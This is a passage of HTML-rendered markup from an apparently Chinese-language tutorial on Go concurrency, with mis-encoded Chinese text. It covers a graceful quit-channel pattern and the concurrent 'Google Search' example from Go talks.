&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">tick 0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tock 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tick 2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">timed out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tick 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tick 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">You&amp;#39;re too slow.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ä¼˜é›…çš„é€€å‡º--quit-chan">ä¼˜é›…çš„é€€å‡º (quit chan)&lt;/h2>
&lt;p>ç”±äº chan å¯ä»¥è¿›è¡ŒåŒå‘é€šä¿¡ï¼ˆround-trip communicationï¼‰ï¼Œå› æ­¤ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å®ç°é€€å‡ºå‰çš„æ¸…ç†å·¥ä½œã€‚&lt;/p>
&lt;p>ä¾‹å¦‚ï¼š&lt;/p>
&lt;ul>
&lt;li>A é€šçŸ¥ B é€€å‡º&lt;/li>
&lt;li>B æ”¶åˆ°é€€å‡ºæŒ‡ä»¤æ—¶ï¼Œæ‰§è¡Œæ¸…ç†åŠ¨ä½œï¼Œå®Œæˆåå†é€šçŸ¥ A&lt;/li>
&lt;li>A æ”¶åˆ°é€šçŸ¥åï¼Œç»“æŸå®Œæ•´çš„é€€å‡ºæµç¨‹&lt;/li>
&lt;/ul>
&lt;p>ä»£ç ç¤ºä¾‹ï¼š&lt;/p>
&lt;p>&lt;a id="code-snippet--graceful-quit">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;io/fs&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;path/filepath&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;errors&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">walkAndGracefulQuit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dir&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">quit&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">done&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">done&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">filepath&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WalkDir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dir&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">info&lt;/span> &lt;span class="nx">fs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DirEntry&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;can&amp;#39;t access path: %q %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">IsDir&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">filepath&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;.md&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// do nothing
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">quit&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;quit&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">cleanup&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">quit&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">walkAndGracefulQuit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">quit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼Œç«‹å³é€€å‡º
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// è¿™é‡Œè¦ç”¨ goroutine åœ¨åå°å‘å°„é€€å‡ºä¿¡å·ï¼Œä»¥é˜²æ­¢ç›®å½•ä¸‹åªæœ‰ä¸€ä¸ª md æ–‡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// ä»¶æ—¶ï¼Œç”±äºæ²¡æœ‰æœºä¼šè¯» quit chan è€Œå‡ºç°æ­»é”ç°è±¡ã€‚å¦ä¸€ç§åšæ³•æ˜¯ï¼Œåˆ©ç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// select æ¥å‘å°„ï¼Œä½†æ²¡æœ‰ç”¨ goroutine è¿™ä¹ˆç®€å•å’Œç¨³å¦¥ã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">quit&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="s">&amp;#34;bye&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ç­‰å¾…æ¸…ç†åŠ¨ä½œå®Œæ¯•ï¼Œæ­£å¼ç»“æŸç¨‹åº
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ¡ˆä¾‹å­¦ä¹ -google-search">æ¡ˆä¾‹å­¦ä¹ ï¼šGoogle Search&lt;/h2>
&lt;p>Go talks æœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„æ¡ˆä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹ã€‚&lt;/p>
&lt;p>å‡è®¾ Google Search æœ‰ä¸‰ä¸ªåç«¯æœç´¢æœåŠ¡ï¼š&lt;/p>
&lt;ul>
&lt;li>Web Search&lt;/li>
&lt;li>Image Search&lt;/li>
&lt;li>Video Search&lt;/li>
&lt;/ul>
&lt;p>è¿™ä¸‰ä¸ªåˆ†åˆ«è´Ÿè´£æœç´¢ç½‘é¡µï¼Œå›¾ç‰‡å’Œè§†é¢‘ã€‚ç°åœ¨è¦æ•´åˆè¿™ä¸‰ä¸ªæœåŠ¡ï¼Œå¯¹ç”¨æˆ·æä¾›å®Œæ•´çš„æœç´¢æœåŠ¡ã€‚&lt;/p>
&lt;h3 id="search-1-dot-0">Search 1.0&lt;/h3>
&lt;p>æœ€ç®€å•å½¢æ€ï¼Œè½®æµè®¿é—®åç«¯æœåŠ¡ï¼Œæ— å¹¶å‘å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">Google&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">Web&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">Image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">Video&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="search-2-dot-0">Search 2.0&lt;/h3>
&lt;p>æ— éœ€é”ã€æ¡ä»¶å˜é‡ã€å›è°ƒï¼Œå³å¯å®ç°å¹¶å‘æœç´¢ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">Google&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Web&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Video&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">result&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="search-2-dot-1">Search 2.1&lt;/h3>
&lt;p>è®¾ç½®æœç´¢æœåŠ¡çš„è¶…æ—¶æ—¶é—´ï¼Œé¿å…è¢«åç«¯è¾ƒæ…¢çš„ï¼ˆæˆ–è€…å‡ºæ•…éšœçš„ï¼‰æœåŠ¡æ‹–å®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">Google&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(){&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Web&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}()&lt;/span>
